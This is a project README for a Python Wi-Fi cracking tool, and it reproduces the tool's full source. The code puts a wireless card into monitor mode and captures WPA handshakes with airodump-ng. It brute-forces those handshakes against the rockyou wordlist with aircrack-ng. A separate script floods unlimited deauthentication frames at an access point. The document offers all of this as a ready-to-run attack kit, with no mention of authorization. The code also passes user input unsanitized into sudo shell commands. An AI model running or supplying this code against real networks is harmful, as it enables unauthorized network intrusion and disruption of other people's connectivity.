# HackingWifiScript
This script written in python3 was created for simplified brute force scanning using the aircrack-ng utility.

## Installation for python3
### Libraries
- <a href="https://pypi.org/project/prompt-toolkit/0.5/">prompt_toolkit</a>

```
git clone https://github.com/John-MetrosSoftware/HackingWifiScript
cd HackingWifiScript
pip3 install prompt_toolkit
python3 HackingWifiScript.py
```

## Installation aircrack-ng
```
sudo apt install aircrack-ng
```


## HackingWifiScript.py

### Imports
```python3
import os
import sys
from prompt_toolkit import prompt
```

### Scanning 
```python3
def scan_wifi(): 
    # Removing redundant processes
    os.system('sudo airmon-ng check kill')

    # Display network devices
    os.system('sudo airmon-ng')

    # Display the name of the network device (default: wlan0)
    device = prompt('Device [wlan0]: ')
    if device.replace(' ', '') == '':device = 'wlan0'

    # Switching network device to monitor mode
    os.system('sudo airmon-ng start {}'.format(device))

    # Start scanning wifi networks
    os.system('sudo airodump-ng {}'.format(device))

    # Handshake name
    cap = prompt('Handshake name: ')
    if cap.replace(' ', '') == '':
        print('Error! You did not enter the name of the handshake. ({}).'.format(cap))
        while True:
            cap = prompt('Handshake name: ')
            if cap.replace(' ', '') != '':
                break

    # Access point channel
    cannel = prompt('Cannel: ')
    if cannel.replace(' ', '') == '':
        print('Error! You have not entered a channel. ({}).'.format(cannel))
        while True:
            cannel = prompt('Cannel: ')
            if cannel.replace(' ', '') != '':
                break

    # Access point bssid
    bssid = prompt('Bssid: ')
    if bssid.replace(' ', '') == '':
        print('Error! You did not enter bssid. ({}).'.format(cannel))
        while True:
            bssid = prompt('Bssid: ')
            if bssid.replace(' ', '') != '':
                break

    # Running a specific wifi network scan
    os.system('sudo airodump-ng -w {} -c {} --bssid {} {}'.format(cap, cannel, bssid, device))
```

### Bruteforce
```python3
def brute_force():
    while True:
        # Handshake input
        cap = prompt('Handshake name: ')  
        if cap.replace(' ', '') == '':
            print('Error! You did not enter the name of the handshake. ({})'.format(cap))
            while True:
                cap = prompt('Handshake name: ')
                if cap.replace(' ', '') != '':
                    break

        # Getting a dictionary file
        if os.path.isfile(cap) == True:
            list_ = prompt('List [/usr/share/wordlists/rockyou.txt]: ')
            if list_.replace(' ', '') == '':
                list_ = '/usr/share/wordlists/rockyou.txt'
            break
        else:
            print('Error! Could not find handshake file. ({}).'.format(cap))

    # Bruteforce
    os.system('aircrack-ng {} -w {}'.format(cap, list_))
```

### Main
```python3
def main():
    os.system('clear || cls')
    print('1. Scanning\n2. Bruteforce\n3. Exit\n')
    select = prompt('Select menu item $ ')
    if select == '1':
        scan_wifi()
    elif select == '2':
        brute_force()
    elif select == '3':
        sys.exit()
    else:
        print('Invalid parameter: \'{}\''.format(select))
```

### Init
```python3
if __name__ == '__main__':
    while True:
        try:
            main()
        except Exception as error:
            print('Error: {}'.format(error))
```

## Deauth.py
### Imports
```python3
import os
import sys
```

### Main
```python3
def main():
    os.system('sudo aireplay-ng --deauth 0 -a {} {}'.format(str(sys.argv[1]), str(sys.argv[2])))
```

### Init
```python3
if __name__ == '__main__':
    try:
        sys.argv[1]
        sys.argv[2]
    except:
        print('Error! Not enough launch options.')
        sys.exit()
    main()
```

## Developer 
Email    : wwwkali00312@gmail.com<br>
Telegram : https://t.me/metrossoftware
